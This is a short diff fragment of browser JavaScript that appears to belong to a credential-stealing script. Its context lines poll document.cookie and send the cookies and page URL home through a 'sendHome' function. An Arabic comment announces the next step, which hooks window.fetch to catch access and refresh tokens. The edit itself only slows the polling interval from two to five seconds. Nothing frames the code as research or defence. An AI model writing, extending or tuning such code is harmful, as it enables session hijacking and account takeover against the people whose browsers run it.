@@ -21,7 +21,7 @@
             lastCookies = document.cookie;
             sendHome({ cookies: lastCookies, url: location.href }, "cookies_changed");
         }
-    }, 2000);
+    }, 5000);
 
     // 3. اعتراض الـ API (Fetch): لصيد access_token و refresh_token من الردود
     const originalFetch = window.fetch;
